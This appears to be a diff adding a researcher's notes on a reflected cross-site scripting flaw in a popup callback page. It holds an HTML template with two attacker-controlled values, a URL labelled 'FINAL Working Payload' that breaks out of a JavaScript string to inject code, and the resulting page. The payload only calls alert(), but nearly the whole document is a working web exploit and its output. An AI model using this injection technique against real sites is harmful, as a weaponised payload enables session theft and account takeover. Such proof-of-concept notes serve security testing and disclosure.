@@ -1,0 +1,68 @@
+At the start we control variables "CONTROLLABLE_ONE" and "CONTROLLABLE_TWO"
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<script type="text/javascript">
+window.onload = function(){
+	try {
+		if (window.opener != null) {
+			if ('' == 'N') {
+				try {
+					window.opener.CONTROLLABLE_ONE();
+				} catch(e) {
+					window.opener.CONTROLLABLE_ONE();
+				}
+			} else {
+				try {
+					window.opener.CONTROLLABLE_ONE('CONTROLLABLE_TWO');
+				} catch(e) {
+					window.opener.CONTROLLABLE_ONE('CONTROLLABLE_TWO');
+				}
+			}
+		}
+	} catch(e) {
+	}
+	if (doRedirectOrigin) {
+		if (!window.location.origin) window.location.origin = "";
+		return;
+	}
+	window.close();
+};
+</script>
+</html>
+
+
+
+FINAL Working Payload
+<server>/X?x=START%27,%27%27);}catch(e){}}}else{alert('X');}}catch(e){}};X=function(){try{if(true){if(true){if(true){alert(`%2B%27
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<script type="text/javascript">
+window.onload = function(){
+	try {
+		if (window.opener != null) {
+			if ('' == 'N') {
+				try {
+					window.opener.abcd();
+				} catch(e) {
+					window.opener.abcd();
+				}
+			} else {
+				try {
+					window.opener.abcd('START','');}catch(e){}}}else{alert("X");}}catch(e){}};X=function(){try{if(true){if(true){if(true){alert(`+'');
+				} catch(e) {
+					window.opener.abcd('START','');}catch(e){}}}else{alert("X");}}catch(e){}};X=function(){try{if(true){if(true){if(true){alert(`+'');
+				}
+			}
+		}
+	} catch(e) {
+	}
+	if (doRedirectOrigin) {
+		if (!window.location.origin) window.location.origin = "";
+		return;
+	}
+	window.close();
+};
+</script>
+</html>
